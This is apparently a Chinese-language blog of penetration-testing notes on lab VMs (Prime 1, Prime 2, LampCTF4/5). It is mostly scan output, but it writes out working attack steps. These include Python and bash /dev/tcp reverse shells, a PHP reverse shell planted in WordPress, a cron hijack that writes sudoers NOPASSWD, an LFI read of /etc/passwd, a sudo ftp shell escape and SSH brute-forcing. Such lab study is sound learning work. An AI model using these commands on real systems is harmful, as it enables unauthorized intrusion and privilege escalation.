<li><p>Starting Nmap 7.93 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2023-02-06 22:49 EST</p>
</li>
<li><p>Nmap scan report for 192.168.0.105</p>
</li>
<li><p>Host is up (0.00025s latency).</p>
</li>
<li><p>PORT   STATE SERVICE VERSION</p>
</li>
<li><p>22&#x2F;tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</p>
</li>
<li><p>80&#x2F;tcp open  http    lighttpd 1.4.28</p>
</li>
<li><p>MAC Address: 00:0C:29:9D:7F:28 (VMware)</p>
</li>
<li><p>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</p>
</li>
<li><p>Device type: general purpose</p>
</li>
<li><p>Running: Linux 3.X|4.X</p>
</li>
<li><p>OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</p>
</li>
<li><p>OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4</p>
</li>
<li><p>Network Distance: 1 hop</p>
</li>
<li><p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
</li>
<li><p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p>
</li>
</ul>
</li>
<li><p>nikto</p>
<ul>
<li><p>┌──(kali㉿kali)-[~&#x2F;Desktop]</p>
</li>
<li><p>└─$ nikto -url 192.168.0.105                                                                                                                                                                                                                                                    1 ⨯</p>
</li>
<li><p>- Nikto v2.1.6</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ Target IP:          192.168.0.105</p>
</li>
<li><p>+ Target Hostname:    192.168.0.105</p>
</li>
<li><p>+ Target Port:        80</p>
</li>
<li><p>+ Start Time:         2023-02-07 01:51:25 (GMT-5)</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ Server: lighttpd&#x2F;1.4.28</p>
</li>
<li><p>+ The anti-clickjacking X-Frame-Options header is not present.</p>
</li>
<li><p>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</p>
</li>
<li><p>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</p>
</li>
<li><p>+ All CGI directories ‘found’, use ‘-C none’ to test none</p>
</li>
<li><p>+ Retrieved x-powered-by header: PHP&#x2F;5.3.10-1ubuntu3.21</p>
</li>
<li><p>+ 26545 requests: 0 error(s) and 4 item(s) reported on remote host</p>
</li>
<li><p>+ End Time:           2023-02-07 01:52:28 (GMT-5) (63 seconds)</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ 1 host(s) tested</p>
</li>
</ul>
</li>
<li><p>dirb 扫描到  <a href="http://192.168.0.105/test/">http://192.168.0.105/test/</a> </p>
</li>
<li><p>whatweb</p>
<ul>
<li><p>┌──(kali㉿kali)-[~&#x2F;Desktop]</p>
</li>
<li><p>└─$ whatweb 192.168.0.105                                                                                                                                                                                                                                                     130 ⨯</p>
</li>
<li><p><a href="http://192.168.0.105/">http://192.168.0.105</a> [200 OK] Country[RESERVED][ZZ], HTTPServer[lighttpd&#x2F;1.4.28], IP[192.168.0.105], PHP[5.3.10-1ubuntu3.21], X-Powered-By[PHP&#x2F;5.3.10-1ubuntu3.21], lighttpd[1.4.28]</p>
</li>
</ul>
</li>
<li><p>nmap –script-help http-methods     </p>
</li>
<li><p>nmap –script http-methods –script-args http-methods.url-path&#x3D;’&#x2F;test’ 192.168.0.105</p>
</li>
<li><p>向对应目录PUT发现确实可以写文件</p>
<ul>
<li>例子<img src="https://api2.mubu.com/v3/document_image/70a922dc-e820-4b23-aa5d-a8afe464b7fc-18494357.jpg" alt="img"></li>
</ul>
</li>
<li><p>反弹shell</p>
<ul>
<li><p>php一句话，然后使用蚁剑连接<img src="https://api2.mubu.com/v3/document_image/d7f49224-c148-450b-8460-74cf27d38a0e-18494357.jpg" alt="img"></p>
</li>
<li><p>使用hackbar 得python reverse_shell 反弹</p>
<ul>
<li><p>python -c ‘import os,pty,socket;s&#x3D;socket.socket();s.connect((“192.168.0.107”,443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(“sh”)’</p>
</li>
<li><p>切换到交互式python  python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’<img src="https://api2.mubu.com/v3/document_image/36c1ba1c-191f-4957-be77-ac546591cb3e-18494357.jpg" alt="img"></p>
</li>
<li><p>另外：</p>
<ul>
<li><p>curl上传文件</p>
<ul>
<li><p>curl -v -T php-reverse-shell.php “<a href="http://192.168.30.208/test/">http://192.168.30.208/test/</a>“</p>
</li>
<li><h2 id="v-–verbose-输出详细内容"><a href="#v-–verbose-输出详细内容" class="headerlink" title="#-v, –verbose                  输出详细内容"></a>#-v, –verbose                  输出详细内容</h2><p>  -<br>- #-T, –upload-file FILE			后跟上传目标文件（Transfer）</p>
</li>
<li><p>#-H, –header      LINE         添加请求头, 可添加多个 -H 参数</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>提权</p>
<ul>
<li><p>whoami;pwd;uname -a</p>
</li>
<li><p>lsb_release -a</p>
<ul>
<li><p>www-data@ubuntu:&#x2F;tmp$ lsb_release -a</p>
</li>
<li><p>lsb_release -a</p>
</li>
<li><p>No LSB modules are available.</p>
</li>
<li><p>Distributor ID: Ubuntu</p>
</li>
<li><p>Description:    Ubuntu 12.04.4 LTS</p>
</li>
<li><p>Release:        12.04</p>
</li>
<li><p>Codename:       precise</p>
</li>
</ul>
</li>
<li><p>seachexploit 没找到</p>
</li>
<li><p>看定时任务</p>
</li>
<li><p>ls -la &#x2F;etc&#x2F;cron*</p>
</li>
<li><p>printf ‘#!&#x2F;bin&#x2F;bash\nbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.137.150&#x2F;8080 0&gt;&amp;1\n’ &gt; &#x2F;tmp&#x2F;update</p>
</li>
<li><p>echo ‘chmod +w &#x2F;etc&#x2F;sudoers &amp;&amp; echo “www-data ALL&#x3D;(ALL)  NOPASSWD:ALL” &gt; &#x2F;etc&#x2F;sudoers’ &gt; &#x2F;tmp&#x2F;update<img src="https://api2.mubu.com/v3/document_image/5c80ac6e-ef16-4183-8724-bdbfe4eb023c-18494357.jpg" alt="img"></p>
</li>
<li><p>sudo &#x2F;bin&#x2F;bash</p>
</li>
<li><p>get</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="prime-1"><a href="#prime-1" class="headerlink" title="prime 1"></a>prime 1</h2><ul>
<li><p>自己慢慢测试</p>
<ul>
<li><p>得到靶机IP 192.168.0.109</p>
</li>
<li><p>nmap 扫描（TCP、UDP、–min-rate、–script）得到22、80开的</p>
</li>
<li><p>nikto访问web目录没找到明显漏洞</p>
</li>
<li><p>dirb 扫描一下web</p>
<ul>
<li><p>访问<a href="http://192.168.0.109/dev%EF%BC%8C%E6%B2%A1%E5%95%A5%E6%9C%89%E7%94%A8%E4%B8%9C%E8%A5%BF">http://192.168.0.109/dev，没啥有用东西</a></p>
</li>
<li><p>dirb <a href="http://192.168.0.109/">http://192.168.0.109</a> -X .txt,.php,.html    找到secret.txt</p>
<ul>
<li><p>Looks like you have got some secrets.</p>
</li>
<li><p>Ok I just want to do some help to you. </p>
</li>
<li><p>Do some more fuzz on every page of php which was finded by you. And if</p>
</li>
<li><p>you get any right parameter then follow the below steps. If you still stuck </p>
</li>
<li><p>Learn from here a basic tool with good usage for OSCP.</p>
</li>
<li><p><a href="https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web">https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web</a></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt   <a href="http://192.168.0.109/index.php?FUZZ">http://192.168.0.109/index.php?FUZZ</a></p>
</li>
<li><p>wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt  –hc 404 –hw 12  <a href="http://192.168.0.109/index.php?FUZZ">http://192.168.0.109/index.php?FUZZ</a></p>
</li>
<li><p>然后得到进一步信息<img src="https://api2.mubu.com/v3/document_image/2ae0ad8b-8f04-4551-a6bb-e9a3a8af50ff-18494357.jpg" alt="img"></p>
</li>
<li><p>发现可以文件读取：<a href="http://192.168.0.109/image.php?file=location.txt&secrettier360=/etc/passwd">http://192.168.0.109/image.php?file=location.txt&amp;secrettier360=/etc/passwd</a> ，saket:x:1001:1001:find password.txt file in my directory:&#x2F;home&#x2F;saket:</p>
</li>
<li><p>访问 &#x2F;home&#x2F;saket&#x2F;password.txt,得到victor密码，进入wordpress管理界面</p>
</li>
<li><p><a href="http://192.168.0.109/wordpress/wp-admin/index.php">http://192.168.0.109/wordpress/wp-admin/index.php</a></p>
</li>
<li><p>编辑一个界面：<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.229.128/1234 0>&1'"); ?></p>
</li>
<li><p>访问<img src="https://api2.mubu.com/v3/document_image/528c58e1-5263-4eb4-ae71-af44a8627176-18494357.jpg" alt="img"></p>
</li>
<li><p>whoami，uname -a，lsb-release，cat &#x2F;etc&#x2F;cron*</p>
</li>
<li><p>内核提权：searchsploit ubuntu 4.10 | grep “Pri” </p>
</li>
<li><p>找个c文件编译</p>
</li>
<li><p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
</li>
<li><p>上传文件</p>
<ul>
<li><p>nc上传</p>
<ul>
<li><p>www-data：nc -lp 4444 &gt; 45010.c</p>
</li>
<li><p>发送端：nc 192.168.0.109 4444  &lt; 45010.c</p>
</li>
<li><p>成功<img src="https://api2.mubu.com/v3/document_image/399f870a-9404-4e31-bb1b-e95c40014fc7-18494357.jpg" alt="img"></p>
</li>
</ul>
</li>
<li><p>开php服务上传</p>
<ul>
<li><p>php  -S  host:port  -t &#x2F;www,php -S 0:1234 -t  phpserver  </p>
</li>
<li><p>wget <a href="http://192.168.0.107:1234/45010.c">http://192.168.0.107:1234/45010.c</a></p>
</li>
<li><p>ok</p>
</li>
<li></li>
</ul>
</li>
<li><p>metasploit 直接upload</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="prime2"><a href="#prime2" class="headerlink" title="prime2"></a>prime2</h2><ul>
<li><p>主机探测信息收集</p>
<ul>
<li><p>ip a，namp -sn 192.168.1.0&#x2F;24，nmap –min-rate 10000 192.168.1.40  ,sudo nmap -sT  -sV -O  192.168.1.40 ,sudo nmap -sU -sV -O  192.168.1.40 </p>
<ul>
<li><p>PORT    STATE SERVICE     VERSION</p>
</li>
<li><p>22&#x2F;tcp  open  ssh         OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)</p>
</li>
<li><p>80&#x2F;tcp  open  http        Apache httpd 2.4.46 ((Ubuntu))</p>
</li>
<li><p>139&#x2F;tcp open  netbios-ssn Samba smbd 4.6.2</p>
</li>
<li><p>445&#x2F;tcp open  netbios-ssn Samba smbd 4.6.2</p>
</li>
<li><p>10123</p>
</li>
<li><p>MAC Address: 00:0C:29:25:DB:31 (VMware)</p>
</li>
<li><p>Device type: general purpose</p>
</li>
<li><p>Running: Linux 4.X|5.X</p>
</li>
<li><p>OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5</p>
</li>
<li><p>OS details: Linux 4.15 - 5.6</p>
</li>
<li><p>Network Distance: 1 hop</p>
</li>
<li><p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
</li>
</ul>
</li>
<li><p>nmap –script&#x3D;vuln -p 22,80,139,445 192.168.1.40  </p>
<ul>
<li><p>┌──(kali㉿kali)-[~&#x2F;Desktop]</p>
</li>
<li><p>└─$ nmap –script&#x3D;vuln -p 22,80,139,445 192.168.1.40                                                                                                                                                                                                                                      130 ⨯</p>
</li>
<li><p>Starting Nmap 7.93 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2023-02-07 20:56 EST</p>
</li>
<li><p>Stats: 0:00:31 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan</p>
</li>
<li><p>NSE Timing: About 50.00% done; ETC: 20:58 (0:00:32 remaining)</p>
</li>
<li><p>Pre-scan script results:</p>
</li>
<li><p>| broadcast-avahi-dos: </p>
</li>
<li><p>|   Discovered hosts:</p>
</li>
<li><p>|     224.0.0.251</p>
</li>
<li><p>|   After NULL UDP avahi packet DoS (CVE-2011-1002).</p>
</li>
<li><p>|_  Hosts are all up (not vulnerable).</p>
</li>
<li><p>Nmap scan report for 192.168.1.40</p>
</li>
<li><p>Host is up (0.00035s latency).</p>
</li>
<li><p>PORT    STATE SERVICE</p>
</li>
<li><p>22&#x2F;tcp  open  ssh</p>
</li>
<li><p>80&#x2F;tcp  open  http</p>
</li>
<li><p>| http-enum: </p>
</li>
<li><p>|   &#x2F;css&#x2F;: Potentially interesting directory w&#x2F; listing on ‘apache&#x2F;2.4.46 (ubuntu)’</p>
</li>
<li><p>|   &#x2F;images&#x2F;: Potentially interesting directory w&#x2F; listing on ‘apache&#x2F;2.4.46 (ubuntu)’</p>
</li>
<li><p>|_  &#x2F;server&#x2F;: Potentially interesting directory w&#x2F; listing on ‘apache&#x2F;2.4.46 (ubuntu)’</p>
</li>
<li><p>|_http-csrf: Couldn’t find any CSRF vulnerabilities.</p>
</li>
<li><p>|_http-stored-xss: Couldn’t find any stored XSS vulnerabilities.</p>
</li>
<li><p>|_http-dombased-xss: Couldn’t find any DOM based XSS.</p>
</li>
<li><p>139&#x2F;tcp open  netbios-ssn</p>
</li>
<li><p>445&#x2F;tcp open  microsoft-ds</p>
</li>
<li><p>10123</p>
</li>
<li><p>Host script results:</p>
</li>
<li><p>|_smb-vuln-ms10-054: false</p>
</li>
<li><p>|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]</p>
</li>
<li><p>|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]</p>
</li>
<li><p>Nmap done: 1 IP address (1 host up) scanned in 66.34 seconds</p>
</li>
</ul>
</li>
<li><p>端口探测：</p>
<ul>
<li><p>80端口：</p>
<ul>
<li><p>nikto -url <a href="http://192.168.1.40/">http://192.168.1.40</a></p>
<ul>
<li><p>- Nikto v2.1.6</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ Target IP:          192.168.1.40</p>
</li>
<li><p>+ Target Hostname:    192.168.1.40</p>
</li>
<li><p>+ Target Port:        80</p>
</li>
<li><p>+ Start Time:         2023-02-07 21:01:32 (GMT-5)</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ Server: Apache&#x2F;2.4.46 (Ubuntu)</p>
</li>
<li><p>+ The anti-clickjacking X-Frame-Options header is not present.</p>
</li>
<li><p>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</p>
</li>
<li><p>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</p>
</li>
<li><p>+ No CGI Directories found (use ‘-C all’ to force check all possible dirs)</p>
</li>
<li><p>+ Server may leak inodes via ETags, header found with file &#x2F;, inode: 1681, size: 5c1cb40b7dd57, mtime: gzip</p>
</li>
<li><p>+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS </p>
</li>
<li><p>+ OSVDB-3268: &#x2F;server&#x2F;: Directory indexing found.</p>
</li>
<li><p>+ &#x2F;server&#x2F;: Possibly Macromedia JRun or CRX WebDAV upload</p>
</li>
<li><p>+ OSVDB-3268: &#x2F;css&#x2F;: Directory indexing found.</p>
</li>
<li><p>+ OSVDB-3092: &#x2F;css&#x2F;: This might be interesting…</p>
</li>
<li><p>+ OSVDB-3268: &#x2F;images&#x2F;: Directory indexing found.</p>
</li>
<li><p>+ 7916 requests: 0 error(s) and 10 item(s) reported on remote host</p>
</li>
<li><p>+ End Time:           2023-02-07 21:02:23 (GMT-5) (51 seconds)</p>
</li>
</ul>
</li>
<li><p>访问&#x2F;server，看到文件下载下来之后在分析<img src="https://api2.mubu.com/v3/document_image/3018fe38-5ae7-4baf-84c8-b2f9f9e8c785-18494357.jpg" alt="img"></p>
</li>
<li><p>wpscan –url 192.168.1.40&#x2F;wp -e    </p>
<ul>
<li>得到admin</li>
</ul>
</li>
</ul>
</li>
<li><p>10123：</p>
<ul>
<li><p>wget下载目录文件：wget -r -np -nH -R index.html <a href="http://url/including/files/you/want/to/download/">http://url/including/files/you/want/to/download/</a></p>
</li>
<li><p>发现一个shell文件，盲猜之后要利用</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="lampCTF4"><a href="#lampCTF4" class="headerlink" title="lampCTF4"></a>lampCTF4</h2><h3 id="自己："><a href="#自己：" class="headerlink" title="自己："></a>自己：</h3><p>得到目标IP</p>
<p>访问web服务</p>
<p>访问blog：<a href="http://192.168.222.142/index.html?page=blog&title=Blog&id=2">http://192.168.222.142/index.html?page=blog&amp;title=Blog&amp;id=2</a></p>
<p>看到id&#x3D;2，怀疑有sql注入，输入引号，还真有，sqlmap能一把梭</p>
<p>得到用户名密码。</p>
<p>ssh：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ssh 192.168.222.142                                                              </span><br><span class="line">Unable to negotiate with 192.168.222.142 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</span><br><span class="line"></span><br><span class="line">问下gpt，还挺厉害</span><br><span class="line">怎样解决：ssh 192.168.222.142                                                              </span><br><span class="line">Unable to negotiate with 192.168.222.142 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</span><br><span class="line">这个问题是由于你的SSH客户端和远程服务器在密钥交换方法上不匹配。目前，远程服务器提供的密钥交换方法包括 diffie-hellman-group-exchange-sha1、diffie-hellman-group14-sha1 和 diffie-hellman-group1-sha1。这些方法可能已被视为不安全或已被弃用。</span><br><span class="line">为了解决这个问题，你可以尝试以下几种方法：</span><br><span class="line">更新你的SSH客户端到最新版本。这样，你的客户端可能会支持更安全的密钥交换方法。在Linux或macOS系统上，你可以通过运行以下命令来更新：</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">在macOS上，如果你使用Homebrew安装了OpenSSH，可以运行：</span><br><span class="line">brew update</span><br><span class="line">brew upgrade openssh</span><br><span class="line">如果你无法更新SSH客户端，或者更新后仍然出现问题，你可以尝试临时修改SSH客户端配置以接受远程服务器提供的密钥交换方法。在命令行中运行以下命令：</span><br><span class="line">ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 user@192.168.222.142</span><br><span class="line">这将允许SSH客户端在本次会话中使用这些方法。请注意，这可能会降低安全性。</span><br><span class="line">另一种解决方案是更新远程服务器的SSH服务器配置，以支持更安全的密钥交换方法。这需要在服务器上编辑/etc/ssh/sshd_config文件，并添加或修改以下行：</span><br><span class="line">KexAlgorithms curve25519-sha256@libssh.org,ecdh-sha2-nistp521,ecdh-sha2-nistp384,ecdh-sha2-nistp256,diffie-hellman-group-exchange-sha256</span><br><span class="line">保存文件后，重启SSH服务器：</span><br><span class="line">sudo systemctl restart ssh</span><br><span class="line">这样，远程服务器将支持更安全的密钥交换方法。请确保在尝试此方法之前，你有远程服务器的管理员权限。</span><br><span class="line"></span><br><span class="line">ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@192.168.222.142</span><br><span class="line">Unable to negotiate with 192.168.222.142 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss</span><br><span class="line">回答：</span><br><span class="line">这个问题是因为SSH客户端与远程服务器在主机密钥类型上不匹配。目前，远程服务器提供的主机密钥类型包括ssh-rsa和ssh-dss，这些类型可能已被视为不安全或已被弃用。</span><br><span class="line"></span><br><span class="line">要解决此问题，你可以尝试以下方法：</span><br><span class="line">临时修改SSH客户端配置以接受远程服务器提供的主机密钥类型。在命令行中运行以下命令：</span><br><span class="line">ssh -oHostKeyAlgorithms=+ssh-rsa,ssh-dss user@192.168.222.142</span><br><span class="line">这将允许SSH客户端在本次会话中使用这些主机密钥类型。请注意，这可能会降低安全性。</span><br><span class="line"></span><br><span class="line">更新远程服务器的SSH服务器配置以支持更安全的主机密钥类型。这需要在服务器上编辑/etc/ssh/sshd_config文件，并添加或修改以下行：</span><br><span class="line">HostKeyAlgorithms ssh-ed25519,ssh-rsa,ssh-dss</span><br><span class="line">同时，请确保在/etc/ssh/目录下生成对应的新主机密钥（如果尚未生成）：</span><br><span class="line"></span><br><span class="line">sudo ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N &#x27;&#x27;</span><br><span class="line">保存文件后，重启SSH服务器：</span><br><span class="line"></span><br><span class="line">sudo systemctl restart ssh</span><br><span class="line">这样，远程服务器将支持更安全的主机密钥类型。请确保在尝试此方法之前，你有远程服务器的管理员权限。</span><br><span class="line">如果以上方法都无法解决问题，你可以考虑更新你的SSH客户端到最新版本，以支持更安全的主机密钥类型。请参考之前的回答中关于如何更新SSH客户端的说明。</span><br></pre></td></tr></table></figure>

<p>解决：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1  -oHostKeyAlgorithms=+ssh-rsa,ssh-dss  dstevens@192.168.222.142</span><br><span class="line">The authenticity of host &#x27;192.168.222.142 (192.168.222.142)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is SHA256:NDWh6/414mOsW4P7K6ICc5R67PrX87ADMFUx9DK9ftk.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.222.142&#x27; (RSA) to the list of known hosts.</span><br><span class="line">BSD SSH 4.1</span><br><span class="line">dstevens@192.168.222.142&#x27;s password: </span><br><span class="line">Last login: Wed Mar 11 09:45:34 2009</span><br><span class="line">[dstevens@ctf4 ~]$ ftp</span><br><span class="line">ftp&gt; !ls</span><br><span class="line">Desktop  html  install.log  mail  software</span><br><span class="line">ftp&gt; !whoami</span><br><span class="line">dstevens</span><br><span class="line">ftp&gt; !/bin/bash</span><br><span class="line">[dstevens@ctf4 ~]$ sudo ftp</span><br><span class="line">Password:</span><br><span class="line">ftp&gt; !whoami</span><br><span class="line">root</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>

<p>这个是遇到的最简单的了，主要难度还是ssh登录的配置</p>
<h2 id="lampCTF5"><a href="#lampCTF5" class="headerlink" title="lampCTF5"></a>lampCTF5</h2><p>扫描发现服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo nmap -sN -sV -O   -p22,25,80,110,111,139,143,445,901,3306  192.168.222.143</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 08:55 EDT</span><br><span class="line">Nmap scan report for 192.168.222.143</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)</span><br><span class="line">25/tcp   open  smtp        Sendmail 8.14.1/8.14.1</span><br><span class="line">80/tcp   open  http        Apache httpd 2.2.6 ((Fedora))</span><br><span class="line">110/tcp  open  pop3        ipop3d 2006k.101</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">143/tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">901/tcp  open  http        Samba SWAT administration server</span><br><span class="line">3306/tcp open  mysql       MySQL 5.0.45</span><br><span class="line">MAC Address: 00:0C:29:DC:88:B2 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Hosts: localhost.localdomain, 192.168.222.143; OS: Unix</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo nmap --script=vuln -p22,25,80,110,111,139,143,445,901,3306  192.168.222.138</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 08:12 EDT</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><br><span class="line">Nmap done: 1 IP address (0 hosts up) scanned in 35.81 seconds</span><br></pre></td></tr></table></figure>

<p>信息收集：</p>
<p>22试下能ssh爆破不（一般不太行，ladon跑，干其他事情）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Start: 2023-04-12 20:21:51</span><br><span class="line">PC Name: PENETRATION Lang: zh-CN</span><br><span class="line">Runtime: .net 4.0  ME: x64 OS: x64</span><br><span class="line">Found: Runtime .net 4.8.4084.0</span><br><span class="line">OS Name: Microsoft Windows 10 专业工作站版</span><br><span class="line">Machine Make: VMware, Inc.</span><br><span class="line">Network: IS Connected</span><br><span class="line">RunUser: Anonymous PR: -IsUser</span><br><span class="line">PID: 5624  CurrentProcess: Ladon911</span><br><span class="line">CPU: Physical: 2 Cores: 4 Logical: 4</span><br><span class="line">FreeSpace: Disk C:\ 76398 MB</span><br><span class="line"></span><br><span class="line">Threads: 80</span><br><span class="line">Not Found PassWord File,Use DefaultPwd</span><br><span class="line">load SshScan</span><br><span class="line">_ICMP: 192.168.222.132  00-0C-29-F7-4D-E0       VMware</span><br><span class="line">192.168.222.132 22      Close</span><br><span class="line">IP Finished!</span><br><span class="line">End: 2023-04-12 20:21:56</span><br></pre></td></tr></table></figure>

<p>┌──(kali㉿kali)-[~&#x2F;Desktop]<br>└─$ ssh -oKexAlgorithms&#x3D;+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1  -oHostKeyAlgorithms&#x3D;+ssh-rsa,ssh-dss <a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x32;&#50;&#x32;&#46;&#x31;&#52;&#51;">&#x72;&#x6f;&#111;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x32;&#50;&#x32;&#46;&#x31;&#52;&#51;</a><br>The authenticity of host ‘192.168.222.143 (192.168.222.143)’ can’t be established.<br>RSA key fingerprint is SHA256:my5mjHup9LZ8CG0KCcvRNwYyvbuVrZI5nfKF7N1XjcU.<br>This key is not known by any other names.<br>Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes<br>Warning: Permanently added ‘192.168.222.143’ (RSA) to the list of known hosts.<br><a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x32;&#50;&#x32;&#46;&#49;&#x34;&#51;">&#x72;&#x6f;&#111;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x32;&#50;&#x32;&#46;&#49;&#x34;&#51;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#114;&#111;&#111;&#116;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x32;&#50;&#x32;&#46;&#x31;&#52;&#51;">&#114;&#111;&#111;&#116;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x32;&#50;&#x32;&#46;&#x31;&#52;&#51;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#50;&#x32;&#50;&#x2e;&#49;&#x34;&#51;">&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#50;&#x32;&#50;&#x2e;&#49;&#x34;&#51;</a>‘s password: </p>
<p>看看能不能在哪个地方得到用户名</p>
<p>3306看也能爆破一下不</p>
